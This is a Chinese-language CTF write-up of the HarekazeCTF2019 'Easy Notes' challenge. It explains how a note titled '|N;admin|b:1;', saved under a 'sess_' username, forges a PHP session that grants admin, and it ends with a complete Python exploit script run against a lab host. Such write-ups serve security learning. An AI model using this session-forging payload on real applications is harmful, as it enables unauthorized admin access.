---
title: '[HarekazeCTF2019]Easy Notes'
date: 2024-10-15 14:36:51
tags: session反序列化
categories: 刷题笔记
---

### [HarekazeCTF2019]Easy Notes

这个原题给了源码的，但现在我们去github上把源码下下来

![image-20241015144240775](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151442845.png)

在文件夹里发现个flag.php，打开后发现如果通过is_admin()就会给出flag

<!--more-->

我们查看is_admin()函数在哪

![image-20241015144554810](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151445840.png)

我们发现admin是通过session来进行认证的

session的保存路径在这

![image-20241015144658898](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151446924.png)

![image-20241015144717745](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151447785.png)

Add note写入的文件也保存在这个目录，并且`$filename`满足session文件名要求：以 `sess_` 开头，且只含有 `a-z`，`A-Z`，`0-9`，-

![image-20241015145223958](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151452141.png)

那么我们只需要创建一个用户名为：sess_

Ubunu默认安装的php中的session.serialize_handler默认设置为php，而这种引擎特点是即可使用|作为键值隔离符。利用|即可将序列字符串拼接

然后`Add note`提交`title`为：`|N;admin|b:1;`，这样反序列化结果即可为：`admin==bool(true)`

最后`export.php?type=.`即可使得这个`.`与前面的`.`拼接成`..`被替换为空，`$filename`也就成为了session文件名了

我们先进行登录

![image-20241015150107253](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151501295.png)

然后添加|N;admin|b:1; 

|N;**来闭合前面的杂乱数据**

![image-20241015150142500](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151501600.png)

![image-20241015151145620](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151511731.png)

我们将-f6234ed0b79d012e

填入session中，刷新得到flag

![image-20241015151603570](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410151516618.png)

贴个脚本

```
import re
import requests
URL = 'http://a57fc9a9-2abd-4fcd-b11b-246e3e346706.node3.buuoj.cn/'

while True:
	# login as sess_
	sess = requests.Session()
	sess.post(URL + 'login.php', data={
		'user': 'sess_'
	})

	# make a crafted note
	sess.post(URL + 'add.php', data={
		'title': '|N;admin|b:1;',
		'body': 'hello'
	})

	# make a fake session
	r = sess.get(URL + 'export.php?type=.').headers['Content-Disposition']
	print(r)
	
	sessid = re.findall(r'sess_([0-9a-z-]+)', r)[0]
	print(sessid)
	
	# get the flag
	r = requests.get(URL + '?page=flag', cookies={
		'PHPSESSID': sessid
	}).content.decode('utf-8')
	flag = re.findall(r'flag\{.+\}', r)

	if len(flag) > 0:
		print(flag[0])
		break

```

